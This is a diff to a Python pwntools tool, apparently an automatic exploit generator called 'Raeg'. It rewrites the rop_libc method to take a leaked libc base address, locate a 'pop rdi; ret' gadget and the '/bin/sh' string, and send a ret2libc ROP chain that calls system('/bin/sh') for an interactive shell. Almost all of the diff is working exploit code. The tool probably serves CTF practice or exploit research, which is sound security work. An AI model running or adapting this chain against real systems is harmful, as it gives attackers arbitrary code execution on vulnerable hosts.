@@ -420,19 +420,18 @@ class Raeg:
 
 
     def rop_libc(self):
-        p = process(self.binary)
-
+        #p = process(self.binary)
+        r = ROP(self.libc)
         gs = '''
             init-pwndbg
         '''
 
-        #p = gdb.debug(self.binary,gdbscript=gs)
+        p = gdb.debug(self.binary,gdbscript=gs)
 
         f = open("./format.txt", "w+")
         f.write(self.libc_offset_string + "\n")
         f.close()
 
-        chain = b""
 
         prompt = p.recvline()
         if b"Leak" in prompt:
@@ -442,15 +441,27 @@ class Raeg:
 
             self.libc.address = self.leak + self.libc_offset
 
-            chain += self.symbolic_padding
-            chain += p64(self.libc.address+0x4f302)
-            chain += p64(0) * 256
+            log.info(f"Found libc base address {hex(self.libc.address)}")
 
         else:
             if self.libc_offset_string != None:
                 p.sendline(bytes(self.libc_offset_string, "utf-8"))
 
                 self.resolve_libc_offset()
+
+        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
+        bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
+        log.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
+        log.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
+
+        #chain = self.symbolic_padding
+        chain = b"A" * 200
+        #chain += p64(self.libc.address + 0x4f302)
+        #chain += p64(0) * 200
+
+        chain += pop_rdi + bin_sh
+        chain += p64(self.elf.sym["_fini"])
+        chain += p64(self.libc.sym["system"])
 
         p.sendline(chain)
         p.interactive()
@@ -656,8 +667,8 @@ if __name__ == "__main__":
     parser.add_argument("bin", help="path of the binary to exploit")
     #parser.add_argument("libc", help="path of libc shared object")
     args = parser.parse_args()
-    rage = Raeg(args.bin, "/opt/libc.so.6")
-    #rage = Raeg(args.bin, "/usr/lib/libc.so.6")
+    #rage = Raeg(args.bin, "/opt/libc.so.6")
+    rage = Raeg(args.bin, "/usr/lib/libc.so.6")
     rage.find_vulnerability()
 
     rage.exploit()
